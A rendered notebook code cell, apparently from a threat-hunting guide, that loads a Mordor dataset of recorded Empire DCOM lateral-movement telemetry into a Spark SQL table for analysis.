+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mpire_dcom_shellwindows_stager.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
